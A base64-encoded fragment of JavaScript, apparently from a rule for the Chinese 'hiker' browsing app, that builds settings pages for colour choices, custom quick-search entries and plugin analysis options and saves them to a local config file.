nB1dF9jb2RlXFxcXFxcXCIsIGltcG9ydENvbmZpZ3MuZGF0YS5jb25maWcpO1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJpbnB1dF9leHRyYVxcXFxcXFwiLCBpbXBvcnRDb25maWdzLmRhdGEuZXh0cmEgfHwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImlucHV0X3NldHRpbmdfY29kZVxcXFxcXFwiLCBpbXBvcnRDb25maWdzLmRhdGEuc2V0dGluZyB8fCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9wYWdlL3NldHRpbmctZWRpdG9yP3J1bGU96Z2S6LGGJnZpZXc9YW5hbHlzaXNNb2RlRWRpdFBhZ2UnO1xcXFxuICAgICAgICB9KVxcXFxuICAgIH0pXFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6ICfwn5OkJyxcXFxcbiAgICAgICAgY29sX3R5cGU6ICdmbGV4X2J1dHRvbicsXFxcXG4gICAgICAgIHVybDogJChPYmplY3Qua2V5cyhhbmFseXNpc0NvbmZpZ3MpLmZpbHRlcihjb25maWdLZXkgPT4gY29uZmlnS2V5ICE9PSAndXNlJyksIDIpLnNlbGVjdCgoKSA9PiB7XFxcXG4gICAgICAgICAgICAvLyBpZiAoaW5wdXQgPT09ICfpu5jorqQnKSByZXR1cm4gJ3RvYXN0Oi8v6buY6K6k6YWN572u5peg5rOV57yW6L6R77yBJ1xcXFxuICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS91dGlscycpKS5ydWxlKVxcXFxuICAgICAgICAgICAgbGV0IGNvbmZpZyA9IGdldENvbmZpZygpO1xcXFxuICAgICAgICAgICAgbGV0IHNlbGVjdENvbmZpZyA9IHtcXFxcbiAgICAgICAgICAgICAgICBuYW1lOiBpbnB1dCxcXFxcbiAgICAgICAgICAgICAgICBkYXRhOiBjb25maWcuYW5hbHlzaXNDb25maWdzW2lucHV0XVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuICQoQ29uZmlnVG9vbC5lbmNUeXBlTGlzdCwgMikuc2VsZWN0KChzZWxlY3RDb25maWcpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL3V0aWxzJykpLnJ1bGUpXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIENvbmZpZ1Rvb2wudG9DbGlwYm9hcmQoQ29uZmlnVG9vbC5leHBvcnQoc2VsZWN0Q29uZmlnLm5hbWUsIHNlbGVjdENvbmZpZywgXFxcXFxcXCLop6PmnpDmj5Lku7bphY3nva5cXFxcXFxcIiwgaW5wdXQpKVxcXFxuICAgICAgICAgICAgfSwgc2VsZWN0Q29uZmlnKVxcXFxuICAgICAgICB9KVxcXFxuICAgIH0pXFxcXG59XFxcXG5cXFxcbi8vIOino+aekOiuvue9ruaooeWdl1xcXFxuZnVuY3Rpb24gYW5hbHlzaXNTZXR0aW5nTW9kdWxlKGQpIHtcXFxcbiAgICBsZXQgYW5hbHlzaXNDb25maWdzID0gZ2V0Q29uZmlnKCdhbmFseXNpc0NvbmZpZ3MnKTtcXFxcbiAgICBhbmFseXNpc01vZGVNb2R1bGUoZCwgYW5hbHlzaXNDb25maWdzKTtcXFxcbiAgICAvKipcXFxcbiAgICAgKiDov5nkuIvpnaLnmoTpg73mmK/mi7/orr7nva7pobXpnaLnmoTphY3nva7lh7rmnaUgZXZhbCDmiafooYzvvIzmnIDnu4jojrflvpfmj5Lku7borr7nva7pobXpnaLnmoQgdXJs77yM6L+Z5LiqIHVybCDlj6/ku6XmmK/nvZHpobXkuZ/lj6/ku6XmmK/kuoznuqfnlYzpnaJcXFxcbiAgICAgKi9cXFxcbiAgICBsZXQgYW5hbHlzaXNTZXR0aW5nID0gYW5hbHlzaXNDb25maWdzW2FuYWx5c2lzQ29uZmlncy51c2VdLnNldHRpbmc7XFxcXG4gICAgbGV0IHJlc3VsdCA9IFxcXFxcXFwidG9hc3Q6Ly/or6Xmj5Lku7bml6Dorr7nva7pobXpnaJcXFxcXFxcIjtcXFxcbiAgICBpZiAoYW5hbHlzaXNTZXR0aW5nKSB7XFxcXG4gICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICBpZiAoYW5hbHlzaXNTZXR0aW5nLmluZGV4T2YoJ3JldHVybicpID09IC0xKSB0aHJvdyBuZXcgRXJyb3IoJ+W/hemhuyByZXR1cm4gQHJ1bGU9anM6IOaIliAkKCkucnVsZScpO1xcXFxuICAgICAgICAgICAgaWYgKGFuYWx5c2lzU2V0dGluZy5zdGFydHNXaXRoKFxcXFxcXFwiKFxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgICAgICAgIGV2YWwoJ3Jlc3VsdCA9ICcgKyBhbmFseXNpc1NldHRpbmcpO1xcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICBldmFsKCdyZXN1bHQgPSAnICsgJygoKSA9PiB7JyArIGFuYWx5c2lzU2V0dGluZyArICd9KSgpJyk7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgIGxvZyhlLm1lc3NhZ2UpO1xcXFxuICAgICAgICAgICAgcmVzdWx0ID0gXFxcXFxcXCJ0b2FzdDovL+mUmeivr+eahOiuvue9rumhtemdouS7o+eggSzor7fliY3lvoAg5pel5b+XIOafpeeci+mUmeivr+WOn+WboFxcXFxcXFwiXFxcXG4gICAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6ICfimpnvuI8nLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXFxcbiAgICAgICAgdXJsOiByZXN1bHRcXFxcbiAgICB9KVxcXFxufVxcXFxuXFxcXG4vL+iHquWumuS5ieW/q+mAn+aQnOe0ouaooeWdl1xcXFxuZnVuY3Rpb24gcXVpY2tTZWFyY2hESVlNb2R1bGUoZCwgY29uZmlnKSB7XFxcXG4gICAgbGV0IHF1aWNrU2VhcmNoQ29uZmlncyA9IGdldENvbmZpZygncXVpY2tTZWFyY2hDb25maWdzJywgY29uZmlnKTtcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogJ+iHquWumuS5ieW/q+mAn+aQnOe0oicuYm9sZCgpLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJyaWNoX3RleHRcXFxcXFxcIlxcXFxuICAgIH0pXFxcXG4gICAgZm9yIChsZXQgY29uZmlnS2V5IG9mIHF1aWNrU2VhcmNoQ29uZmlncy5vcmRlcikge1xcXFxuICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IGNvbmZpZ0tleSxcXFxcbiAgICAgICAgICAgIHVybDogJCgn4p6V5piv5re75YqgXFxcXFxcXFxu4p6W5piv5Yig6ZmkXFxcXFxcXFxu8J+TneaYr+S/ruaUuVxcXFxcXFxcbvCflIHmmK/mjpLluo9cXFxcXFxcXG7impnvuI/mmK/orr7nva7moLflvI8nKS5jb25maXJtKCgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5LiL5qyh5LiN6KaB5YaN54K55oiR5LqGJ1xcXFxuICAgICAgICAgICAgfSksXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJ1xcXFxuICAgICAgICB9KVxcXFxuICAgIH1cXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICBjb2xfdHlwZTogJ2JsYW5rX2Jsb2NrJ1xcXFxuICAgIH0pXFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6ICfinpXvuI8nLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXFxcbiAgICAgICAgdXJsOiAkKCfmmL7npLrlkI1AQOWwj+eoi+W6j+WQjUBA5Zu+54mH6ZO+5o6lJywgJ+agueaNruaPkOekuui+k+WFpeWwseWlveS6hlxcXFxcXFxcbuWwj+eoi+W6j+WQjeS4uuepuuWImeS4uua1t+mYlOaQnOe0oicpLmlucHV0KCgpID0+IHtcXFxcbiAgICAgICAgICAgIGxldCBjb25maWcgPSBKU09OLnBhcnNlKGZldGNoKGdldE15VmFyKCdxZGJfY29uZmlnJykpKTtcXFxcbiAgICAgICAgICAgIGlucHV0ID0gaW5wdXQuc3BsaXQoJ0BAJyk7XFxcXG4gICAgICAgICAgICBpZihpbnB1dC5sZW5ndGggIT0gMyB8fCBpbnB1dFswXSA9PT0gXFxcXFxcXCJcXFxcXFxcIikgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/moLzlvI/kuI3lr7nvvIzmjInmoLzlvI/ovpPlhaUhXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICBpZiAoY29uZmlnLnF1aWNrU2VhcmNoQ29uZmlncy5vcmRlci5pbmRleE9mKGlucHV0WzBdKSA9PSAtMSkgY29uZmlnLnF1aWNrU2VhcmNoQ29uZmlncy5vcmRlci5wdXNoKGlucHV0WzBdKTtcXFxcbiAgICAgICAgICAgIGNvbmZpZy5xdWlja1NlYXJjaENvbmZpZ3NbaW5wdXRbMF1dID0ge1xcXFxuICAgICAgICAgICAgICAgIG5hbWU6IGlucHV0WzFdLFxcXFxuICAgICAgICAgICAgICAgIHBpYzogaW5wdXRbMl1cXFxcbiAgICAgICAgICAgIH07XFxcXG4gICAgICAgICAgICB3cml0ZUZpbGUoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSwgSlNPTi5zdHJpbmdpZnkoY29uZmlnKSk7XFxcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5re75Yqg5oiQ5YqfJztcXFxcbiAgICAgICAgfSlcXFxcbiAgICB9KTtcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogJ+KelicsXFxcXG4gICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcXFxuICAgICAgICB1cmw6ICQocXVpY2tTZWFyY2hDb25maWdzLm9yZGVyLCAyKS5zZWxlY3QoKCkgPT4ge1xcXFxuICAgICAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UocmVxdWVzdChnZXRNeVZhcigncWRiX2NvbmZpZycpKSlcXFxcbiAgICAgICAgICAgIHJldHVybiAkKCfnoa7orqTliKDpmaRcXFxcXFxcIicgKyBpbnB1dCArICdcXFxcXFxcIu+8nycpLmNvbmZpcm0oKGNvbmZpZywgY29uZmlnS2V5KSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGluZGV4ID0gY29uZmlnLnF1aWNrU2VhcmNoQ29uZmlncy5vcmRlci5pbmRleE9mKGNvbmZpZ0tleSk7XFxcXG4gICAgICAgICAgICAgICAgY29uZmlnLnF1aWNrU2VhcmNoQ29uZmlncy5vcmRlci5zcGxpY2UoaW5kZXgsIDEpO1xcXFxuICAgICAgICAgICAgICAgIGRlbGV0ZSBjb25maWcucXVpY2tTZWFyY2hDb25maWdzW2NvbmZpZ0tleV1cXFxcbiAgICAgICAgICAgICAgICB3cml0ZUZpbGUoZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSwgSlNPTi5zdHJpbmdpZnkoY29uZmlnKSlcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+WIoOmZpCcgKyBjb25maWdLZXkgKyAn5oiQ5YqfJ1xcXFxuICAgICAgICAgICAgfSwgY29uZmlnLCBpbnB1dClcXFxcbiAgICAgICAgfSlcXFxcbiAgICB9KVxcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiAn8J+TnScsXFxcXG4gICAgICAgIGNvbF90eXBlOiAnZmxleF9idXR0b24nLFxcXFxuICAgICAgICB1cmw6ICQocXVpY2tTZWFyY2hDb25maWdzLm9yZGVyLCAyKS5zZWxlY3QoKCkgPT4ge1xcXFxuICAgICAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UocmVxdWVzdChnZXRNeVZhcigncWRiX2NvbmZpZycpKSk7XFxcXG4gICAgICAgICAgICBsZXQgcXVpY2tTZWFyY2hDb25maWdzID0gY29uZmlnLnF1aWNrU2VhcmNoQ29uZmlncztcXFxcbiAgICAgICAgICAgIGxldCBkdGV4dCA9IGlucHV0ICsgJ0BAJyArIHF1aWNrU2VhcmNoQ29uZmlnc1tpbnB1dF0ubmFtZSArICdAQCcgKyBxdWlja1NlYXJjaENvbmZpZ3NbaW5wdXRdLnBpYztcXFxcbiAgICAgICAgICAgIHJldHVybiAkKGR0ZXh0LCAn6K+35L+u5pS5JykuaW5wdXQoKGNvbmZpZywgcmF3KSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgaW5wdXQgPSBpbnB1dC5zcGxpdCgnQEAnKTtcXFxcbiAgICAgICAgICAgICAgICBpZiAocmF3ICE9IGlucHV0WzBdKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBpbmRleCA9IGNvbmZpZy5xdWlja1NlYXJjaENvbmZpZ3Mub3JkZXIuaW5kZXhPZihyYXcpO1xcXFxuICAgICAgICAgICAgICAgICAgICBjb25maWcucXVpY2tTZWFyY2hDb25maWdzLm9yZGVyW2luZGV4XSA9IGlucHV0WzBdO1xcXFxuICAgICAgICAgICAgICAgICAgICBkZWxldGUgY29uZmlnLnF1aWNrU2VhcmNoQ29uZmlnc1tyYXddO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICBpZiAoY29uZmlnLnF1aWNrU2VhcmNoQ29uZmlncy5vcmRlci5pbmRleE9mKGlucHV0WzBdKSA9PSAtMSkgY29uZmlnLnF1aWNrU2VhcmNoQ29uZmlncy5vcmRlci5wdXNoKGlucHV0WzBdKTtcXFxcbiAgICAgICAgICAgICAgICBjb25maWcucXVpY2tTZWFyY2hDb25maWdzW2lucHV0WzBdXSA9IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgbmFtZTogaW5wdXRbMV0sXFxcXG4gICAgICAgICAgICAgICAgICAgIHBpYzogaW5wdXRbMl1cXFxcbiAgICAgICAgICAgICAgICB9O1xcXFxuICAgICAgICAgICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKTtcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+S/ruaUueaIkOWKnyc7XFxcXG4gICAgICAgICAgICB9LCBjb25maWcsIGlucHV0KVxcXFxuICAgICAgICB9KVxcXFxuICAgIH0pXFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6ICfwn5SBJyxcXFxcbiAgICAgICAgY29sX3R5cGU6ICdmbGV4X2J1dHRvbicsXFxcXG4gICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0hpc3RvcnkjJykucnVsZSgoKSA9PiB7XFxcXG4gICAgICAgICAgICBhZGRMaXN0ZW5lcignb25DbG9zZScsICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGNsZWFyTXlWYXIoJ2pzb24nKTtcXFxcbiAgICAgICAgICAgICAgICBjbGVhck15VmFyKCdvcCcpO1xcXFxuICAgICAgICAgICAgfSkpXFxcXG4gICAgICAgICAgICBpZiAoZ2V0TXlWYXIoJ2pzb24nKSA9PSBcXFxcXFxcIlxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UocmVxdWVzdChnZXRNeVZhcigncWRiX2NvbmZpZycpKSk7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHF1aWNrU2VhcmNoQ29uZmlncyA9IGNvbmZpZy5xdWlja1NlYXJjaENvbmZpZ3M7XFxcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoJ2pzb24nLCBKU09OLnN0cmluZ2lmeShxdWlja1NlYXJjaENvbmZpZ3MpKTtcXFxcbiAgICAgICAgICAgIH1cXFxcblxcXFxuICAgICAgICAgICAgbGV0IG9sZCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2pzb24nKSk7XFxcXG4gICAgICAgICAgICBsZXQgZCA9IFtdO1xcXFxuICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogJ+WIhuWIq+eCueWHu+S4pOmhueS7peS6pOaNoumhuuW6j1xcXFxcXFxcbuKAmOKAmOaOkuW6j+WujOavleWQjueCueaIkeS/neWtmOaOkuW6jyzlkKbliJnmjpLluo/kuI3nlJ/mlYjigJnigJknLFxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMScsXFxcXG4gICAgICAgICAgICAgICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKCgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UoZmV0Y2goZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSkpO1xcXFxuICAgICAgICAgICAgICAgICAgICBjb25maWcucXVpY2tTZWFyY2hDb25maWdzID0gSlNPTi5wYXJzZShnZXRNeVZhcignanNvbicpKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgd3JpdGVGaWxlKGdldE15VmFyKCdxZGJfY29uZmlnJyksIEpTT04uc3RyaW5naWZ5KGNvbmZpZykpO1xcXFxuICAgICAgICAgICAgICAgICAgICBiYWNrKHRydWUpO1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5L+u5pS55oiQ5YqfJ1xcXFxuICAgICAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgb2xkLm9yZGVyLmZvckVhY2goKHZhbHVlLCBpbmRleCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBnZXRNeVZhcignb3AnKSA9PSB2YWx1ZSA/IHZhbHVlICsgJ+KAmOKAmCjlvZPliY3pgInkuK0p4oCZ4oCZJyA6IHZhbHVlLFxcXFxuICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ3RleHRfMScsXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogJCgpLmxhenlSdWxlKChrZXksIGluZGV4KSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgb3AgPSBnZXRNeVZhcignb3AnKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChvcCA9PSAnJykge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKCdvcCcsIGtleSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKG9wID09IGtleSkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFyTXlWYXIoJ29wJyk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBvbGQgPSBKU09OLnBhcnNlKGdldE15VmFyKCdqc29uJykpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBuZXdhID0ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtb2RlOiBvbGQubW9kZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3JkZXI6IG9sZC5vcmRlclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IG9waW5kZXggPSBuZXdhLm9yZGVyLmluZGV4T2Yob3ApO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChNYXRoLmFicyhvcGluZGV4IC0gaW5kZXgpID09IDEpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmV3YS5vcmRlcltvcGluZGV4XSA9IGtleTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmV3YS5vcmRlcltpbmRleF0gPSBvcDtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKG9waW5kZXggPiBpbmRleCkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuZXdhLm9yZGVyLnNwbGljZShvcGluZGV4LCAxKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmV3YS5vcmRlci5zcGxpY2UoaW5kZXgsIDAsIG9wKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuZXdhLm9yZGVyLnNwbGljZShvcGluZGV4LCAxKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmV3YS5vcmRlci5zcGxpY2UoaW5kZXggLSAxLCAwLCBvcCk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5ld2Eub3JkZXIuZm9yRWFjaCh2YWx1ZSA9PiBuZXdhW3ZhbHVlXSA9IG9sZFt2YWx1ZV0pXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoJ2pzb24nLCBKU09OLnN0cmluZ2lmeShuZXdhKSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJNeVZhcignb3AnKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgfSwgdmFsdWUsIGluZGV4KVxcXFxuICAgICAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgc2V0UmVzdWx0KGQpO1xcXFxuICAgICAgICB9KVxcXFxuICAgIH0pXFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6ICfimpnvuI8nLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ2ZsZXhfYnV0dG9uJyxcXFxcbiAgICAgICAgdXJsOiAkKHF1aWNrU2VhcmNoQ29uZmlnc1snbW9kZSddIHx8IFxcXFxcXFwiXFxcXFxcXCIsICfor7fmraPnoa7ovpPlhaXnu4Tku7bmoLflvI9cXFxcXFxcXG7lu7rorq7lgLw6ZmxleF9idXR0b24gc2Nyb2xsX2J1dHRvbiBpY29uX3JvdW5kX3NtYWxsXzQgaWNvbl9zbWFsbF80JykuaW5wdXQoKCkgPT4ge1xcXFxuICAgICAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UocmVxdWVzdChnZXRNeVZhcigncWRiX2NvbmZpZycpKSk7XFxcXG4gICAgICAgICAgICBjb25maWcucXVpY2tTZWFyY2hDb25maWdzLm1vZGUgPSBpbnB1dDtcXFxcbiAgICAgICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKTtcXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/moLflvI/kv67mlLnmiJDlip8nXFxcXG4gICAgICAgIH0pXFxcXG4gICAgfSlcXFxcbn1cXFxcblxcXFxuLy/orr7nva7pobXpnaJcXFxcbmZ1bmN0aW9uIHNldHRpbmdQYWdlKCkge1xcXFxuICAgIGxldCBjb25mID0gZ2V0Q29uZmlnKCk7XFxcXG4gICAgbGV0IGQgPSBbXTtcXFxcblxcXFxuICAgIGxldCBzdGFyQ29sb3IgPSBjb25mLnN0YXJDb2xvciB8fCAnI2ZmYWMyZCc7XFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ0nICsgJ+iHquWumuS5ieaYn+aYn+minOiJsicuYm9sZCgpLFxcXFxuICAgICAgICBkZXNjOiAn4oCc4oCc4oCd4oCdPGZvbnQgY29sb3I9JyArIHN0YXJDb2xvciArICc+JyArICfimIXimIXimIXimIXimIU8L2ZvbnQ+JyxcXFxcbiAgICAgICAgY29sX3R5cGU6ICd0ZXh0XzEnLFxcXFxuICAgICAgICB1cmw6ICQoc3RhckNvbG9yLCAn5Yir5b+Y5LqGIycpLmlucHV0KCgpID0+IHtcXFxcbiAgICAgICAgICAgIGxldCBjb25maWcgPSBKU09OLnBhcnNlKGZldGNoKGdldE15VmFyKCdxZGJfY29uZmlnJykpKTtcXFxcbiAgICAgICAgICAgIGNvbmZpZy5zdGFyQ29sb3IgPSBpbnB1dDtcXFxcbiAgICAgICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKTtcXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+iuvue9ruabtOaUueW3suS/neWtmFxcXFxcXFwiO1xcXFxuICAgICAgICB9KVxcXFxuICAgIH0pXFxcXG4gICAgbGV0IGNob29zZUNvbG9yID0gY29uZi5jaG9vc2VDb2xvciB8fCAnI0ZBNzI5OCc7XFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ0nICsgJ+iHquWumuS5iemAieS4reagh+etvuminOiJsicuYm9sZCgpLFxcXFxuICAgICAgICBkZXNjOiAn4oCc4oCc4oCd4oCdPGZvbnQgY29sb3I9JyArIGNob29zZUNvbG9yICsgJz4nICsgJ+aIkeaYr+mihOiniOaViOaenDwvZm9udD4nLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ3RleHRfMScsXFxcXG4gICAgICAgIHVybDogJChjaG9vc2VDb2xvciwgJ+WIq+W/mOS6hiMnKS5pbnB1dCgoKSA9PiB7XFxcXG4gICAgICAgICAgICBsZXQgY29uZmlnID0gSlNPTi5wYXJzZShmZXRjaChnZXRNeVZhcigncWRiX2NvbmZpZycpKSk7XFxcXG4gICAgICAgICAgICBjb25maWcuY2hvb3NlQ29sb3IgPSBpbnB1dDtcXFxcbiAgICAgICAgICAgIHdyaXRlRmlsZShnZXRNeVZhcigncWRiX2NvbmZpZycpLCBKU09OLnN0cmluZ2lmeShjb25maWcpKTtcXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+iuvue9ruabtOaUueW3suS/neWtmFxcXFxcXFwiO1xcXFxuICAgICAgICB9KVxcXFxuICAgIH0pXFxcXG5cXFxcbiAgICBob21lUGFnZVNldHRpbmdNb2R1bGUoZCk7XFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgY29sX3R5cGU6ICdsaW5lJ1xcXFxuICAgIH0pXFxcXG5cXFxcbiAgICBxdWlja1NlYXJjaERJWU1vZHVsZShkLCBjb25mKTtcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICBjb2xfdHlwZTogJ2xpbmUnXFxcXG4gICAgfSlcXFxcblxcXFxuICAgIGRldGFpbFZpZXdTZXR0aW5nTW9kdWxlKGQpO1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIGNvbF90eXBlOiAnbGluZSdcXFxcbiAgICB9KVxcXFxuXFxcXG4gICAgaWYgKHRydWUvKmdldEl0ZW0oJ3Bhc3N3b3JkJykgPT0gJ3RydWUnKi8pIHtcXFxcbiAgICAgICAgYW5hbHlzaXNTZXR0aW5nTW9kdWxlKGQpO1xcXFxuICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdsaW5lJ1xcXFxuICAgICAgICB9KVxcXFxuICAgIH1cXFxcblxcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdJyArICfmgaLlpI3pu5jorqTorr7nva4nLmJvbGQoKSxcXFxcbiAgICAgICAgZGVzYzogJ+mHjeeUnycsXFxcXG4gICAgICAgIGNvbF90eXBlOiAndG